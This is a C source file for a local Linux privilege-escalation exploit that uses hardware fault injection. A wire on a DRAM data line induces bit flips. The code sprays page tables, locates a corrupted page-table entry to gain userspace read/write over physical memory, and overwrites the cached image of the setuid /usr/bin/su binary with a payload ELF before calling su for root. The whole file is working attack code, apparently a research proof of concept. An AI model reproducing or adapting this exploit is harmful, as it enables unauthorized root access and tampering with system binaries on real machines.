/*

Hardware setup: This time I put the "antenna" wire on DQ25, which will fault 64-bit values to +/-32MiB

Exploit strat: We fill up as much of physical memory as possible with page tables.
When we fault a PTE read, we have a good chance of landing on a page table, giving us R/W
access to a page table from userspace.

*/

#define _GNU_SOURCE 
#include <stdio.h>
#include <unistd.h>
#include <assert.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>

#include "payload/payload_elf.h"

#define TWO_MB 0x200000
#define MEMFD_SIZE (TWO_MB * 16)

// TODO: size this dynamically based on /proc/meminfo
#define PT_SPRAY_COUNT 0x2000

// needs to be at least 2MiB aligned
#define SPRAY_BASE 0xdead0000000

// This is hardware-dependent, I found this from /proc/iomem
#define PHYS_MEM_BASE 0x00100000
#define PHYS_MEM_END  0x3a50f000

// target bin needs to be setuid root
#define TARGET_BIN "/usr/bin/su"

void hexdump(void *addr, size_t len) {
	uint8_t *buf = (uint8_t *)addr;
	for (size_t i = 0; i < len; i += 16) {
		for (size_t j = 0; j < 16 && (i + j < len); j++) {
			printf("%02x", buf[i+j]);
		}
		printf("\n");
	}
}

uint64_t *find_glitched_pte(void)
{
	printf("[*] Searching for bitflipped PTEs\n"); // this is when the physical glitching should start
	for(;;) {
		printf(".");
		fflush(stdout);
		for (size_t i = 0; i < PT_SPRAY_COUNT; i++) {
			for (size_t j = 0; j < MEMFD_SIZE; j += TWO_MB) {
				uint64_t *ptr = (uint64_t*)(SPRAY_BASE + i * MEMFD_SIZE + j);
				if (*ptr != 0x4141414141414141) {
					printf("\nFAULT!\n");
					//hexdump(ptr, 4096);

					// now we need to inspect the page to see if it looks like one of our pagetables

					// we expect NX bit to be set
					if ((*ptr >> 63) != 1) {
						continue;
					}
					
					// we expect all but the first 64-bit word to be zero
					int success = 1;
					for (size_t k = 1; k < 0x1000 / 8; k++) {
						if (ptr[k]) {
							success = 0;
							break;
						}
					}
					if (success) {
						return ptr;
					}
				}
			}
		}
	}
}

int main()
{
	printf("[*] Setting up memfd\n");

	int memfd = memfd_create("hax", MFD_CLOEXEC);
	if (memfd < 0) {
		perror("memfd_create");
		return -1;
	}

	if(ftruncate(memfd, MEMFD_SIZE) != 0) {
		perror("ftruncate");
		return -1;
	}

	// populate the memfd with recognizeable values
	for (size_t i=0; i < MEMFD_SIZE; i += TWO_MB) {
		assert(lseek(memfd, i, SEEK_SET) >= 0);
		assert(write(memfd, "AAAAAAAABBBBBBBB", 16) == 16);
	}


	printf("[*] Spraying pagetables\n");
	for (size_t i = 0; i < PT_SPRAY_COUNT; i++) {
		uint8_t *map_vaddr = (uint8_t*)SPRAY_BASE + i * MEMFD_SIZE;
		uint8_t *mmap_res = mmap(map_vaddr, MEMFD_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED_NOREPLACE, memfd, 0);
		assert(mmap_res == map_vaddr);
	}

	/* on success, glitched_pte was glitched during a DRAM read.
	   the actual PTE value in DRAM is unmodified.

	   therefore, it is essential that it doesn't fall out of cache until the exploit is done.
	   we'll re-read it periodically - it's marked "volatile" so the compiler doesn't elide those reads.
	*/
	volatile uint64_t * volatile glitched_pte = find_glitched_pte();
	printf("[+] Found glitched PTE @ %p\n", (void*)glitched_pte);
	printf("[*] PTE value: 0x%016lx\n", *glitched_pte);
	printf("[*] Searching for corresponding mapping...\n");

	uint64_t orig_pte = *glitched_pte;
	*glitched_pte = *glitched_pte & 0x8000000000000fff; // point it at address zero (arbitrary - make sure physmem 0 is readable on your hardware I guess?)

	//uint64_t foo = 0;
	uint8_t *glitched_map = NULL;

	// loop twice to make sure the tlb/cache gets busted (may be unnecessary)
	//for (int k=0; k<2; k++) {
		for (size_t i = 0; i < PT_SPRAY_COUNT; i++) {
			for (size_t j = 0; j < MEMFD_SIZE; j += TWO_MB) {
				uint64_t *ptr = (uint64_t*)(SPRAY_BASE + i * MEMFD_SIZE + j);
				//*glitched_pte; // read to keep it in cache?
				if (ptr == glitched_pte) continue;
				if (*ptr == *glitched_pte) {
					printf("[-] That's not supposed to happen\n");
					return -1;
				}
				if (*ptr != 0x4141414141414141) {
					printf("Found it!\n");
					printf("%p\n", (void*)ptr);

					hexdump(ptr, 128);

					glitched_map = (uint8_t*)ptr;
				}
			}
		}
	//}

	if (glitched_map == NULL) {
		printf("[-] Failed to find corresponding mapping :(\n");
		return -1;
	}

	printf("[+] Found the mapping @ %p\n", (void*)glitched_map);

	printf("[*] Mapping the target binary (" TARGET_BIN ")\n");
	int target_fd = open(TARGET_BIN, O_CLOEXEC | O_RDONLY);
	if (target_fd < 0) {
		perror("open");
		printf("[-] Failed to open target binary :(\n");
		return -1;
	}
	void *target_mapping = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, target_fd, 0);
	if (target_mapping == NULL) {
		perror("mmap");
		return -1;
	}

	int found = 0;
	for (uintptr_t paddr = PHYS_MEM_BASE; paddr < PHYS_MEM_END; paddr += 0x1000) {
		*glitched_pte = (*glitched_pte & 0x8000000000000fff) | paddr;
		//printf(".");
		//fflush(stdout);

		// TODO: break this out into a "tlb flush" function
		for (size_t i = 0; i < 2048; i++) { // enough to flush TLB
			volatile uint64_t * volatile ptr = (uint64_t*)(SPRAY_BASE + i * MEMFD_SIZE);
			*glitched_pte; // read to keep it in cache?
			*ptr;
		}

		printf("\rScanning physmem %lu%%", (paddr-PHYS_MEM_BASE)*100/(PHYS_MEM_END-PHYS_MEM_BASE));
	
		//printf("0x%lx\n", paddr);
		//hexdump(glitched_map, 16);
		if (memcmp(glitched_map, target_mapping, 0x1000) == 0) {
			printf("\n[+] Found target at phys addr 0x%016lx, patching.\n", paddr);
			found = 1;
			memcpy(glitched_map, payload_elf, payload_elf_len);
			// TODO: check to see if it worked, early exit?
		}
	}

	*glitched_pte = orig_pte; // maybe make linux happier

	if (!found) {
		printf("\n[-] Failed to find patch site\n");
		return -1;
	}

	printf("\n[+] About to get root?\n");
	system("su"); // TODO: execve
}
